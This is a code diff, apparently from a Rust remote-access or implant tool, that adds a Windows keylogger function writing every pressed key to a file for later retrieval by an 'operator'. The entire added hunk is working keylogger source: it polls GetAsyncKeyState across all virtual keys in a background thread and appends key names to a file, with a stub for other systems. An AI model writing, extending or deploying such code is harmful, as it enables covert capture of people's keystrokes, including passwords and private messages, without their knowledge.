@@ -267,6 +267,48 @@ pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
     Ok(crate::sessions::Stream::new(rx, handle))
 }
 
+/// Write the keys into a file instead of streaming them.
+///
+/// A stream has to be watched; a file is fetched later, at the operator's
+/// own pace, and it keeps the whole of a session in one place.
+#[cfg(windows)]
+pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
+    let path = path.to_string();
+    std::thread::spawn(move || {
+        let mut file = match std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&path)
+        {
+            Ok(f) => f,
+            Err(e) => {
+                eprintln!("key logger: {path}: {e}");
+                return;
+            }
+        };
+        use std::io::Write;
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(seconds);
+        let mut previous = [false; 256];
+        while std::time::Instant::now() < deadline {
+            for vk in 0x08u16..=0xFEu16 {
+                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
+                if down && !previous[vk as usize] {
+                    let _ = writeln!(file, "{}", describe(vk));
+                }
+                previous[vk as usize] = down;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(50));
+        }
+    });
+    Ok(format!("the key logger writes to {path}\n"))
+}
+
+/// The key logger that writes into a file is a Windows capability.
+#[cfg(not(windows))]
+pub fn keylog_to_file(_path: &str, _seconds: u64) -> Result<String, String> {
+    Err("the key logger is a Windows capability".to_string())
+}
+
 /// The name of a virtual key code.
 #[cfg(windows)]
 fn describe(vk: u16) -> String {
